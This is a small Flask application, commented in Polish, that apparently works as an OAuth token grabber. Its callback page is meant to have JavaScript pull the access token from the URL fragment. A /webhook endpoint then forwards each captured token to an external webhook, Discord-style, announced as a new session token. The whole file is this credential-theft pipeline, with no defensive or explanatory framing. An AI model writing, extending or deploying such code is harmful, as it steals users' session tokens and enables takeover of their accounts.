from flask import Flask, request, render_template
import requests
import os

app = Flask(__name__)

CLIENT_ID = os.getenv("CLIENT_ID")
REDIRECT_URI = os.getenv("REDIRECT_URI")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/callback')
def callback():
    # Token jest w URL jako fragment #access_token=...
    # Flask nie widzi fragmentu, więc używamy JavaScript na stronie
    return render_template('index.html')

@app.route('/webhook')
def webhook():
    # Endpoint do którego JS wysyła token
    token = request.args.get('token')
    if token and WEBHOOK_URL:
        try:
            requests.post(WEBHOOK_URL, json={
                "content": f"**🎯 Nowy token sesyjny!**\n```{token}```"
            })
            return "OK", 200
        except:
            return "Error", 500
    return "No token", 400

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
